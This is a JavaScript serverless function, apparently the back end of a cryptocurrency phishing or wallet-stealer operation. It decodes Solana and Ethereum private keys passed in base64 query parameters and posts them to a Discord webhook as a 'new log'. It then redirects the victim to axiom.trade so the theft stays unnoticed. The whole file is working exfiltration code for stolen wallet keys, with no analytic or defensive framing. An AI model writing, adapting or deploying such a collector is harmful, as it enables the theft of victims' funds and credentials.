exports.handler = async (event) => {
  const params = event.queryStringParameters || {};

  const encodedId1 = params.id;
  const encodedId2 = params.id2;

  if (!encodedId1 && !encodedId2) {
    return { statusCode: 400, body: "Missing parameters" };
  }

  const decodeBase64 = (b64) => {
    try {
      return Buffer.from(b64, "base64").toString("utf8");
    } catch {
      return null;
    }
  };

  const processDecoded = (decoded) => {
    if (!decoded) return [];

    let values;

    try {
      const parsed = JSON.parse(decoded);
      if (Array.isArray(parsed)) {
        values = parsed;
      } else {
        throw new Error("Not array");
      }
    } catch {
      values = decoded.split(",").map((v) => v.trim());
    }

    return values
      .map((v) =>
        v
          .replace(/^\s*"?\s*\[?/, "")
          .replace(/"?\s*\]?\s*$/, "")
          .trim()
      )
      .filter(Boolean);
  };

  const decoded1 = encodedId1 ? decodeBase64(encodedId1) : null;
  const decoded2 = encodedId2 ? decodeBase64(encodedId2) : null;

  const set1 = decoded1 ? processDecoded(decoded1) : [];
  const set2 = decoded2 ? processDecoded(decoded2) : [];

  const escapeDiscord = (s) => s.replace(/`/g, "\\`");

  let message = "@everyone new log\n\n";

  if (set1.length) {
    message += "sol pkeys:\n";
    message += set1.map((v, i) => `${i + 1}. \`${escapeDiscord(v)}\``).join("\n");
    message += "\n\n";
  }

  if (set2.length) {
    message += "eth pkeys:\n";
    message += set2.map((v, i) => `${i + 1}. \`${escapeDiscord(v)}\``).join("\n");
    message += "\n";
  }

  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

  if (webhookUrl) {
    try {
      await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: message }),
      });
    } catch (err) {
      console.error("failed to send:", err);
    }
  } else {
    console.error("env variables not set");
  }

  return {
    statusCode: 302,
    headers: {
      Location: "https://axiom.trade/discover?id=1&id2=1",
    },
  };
};
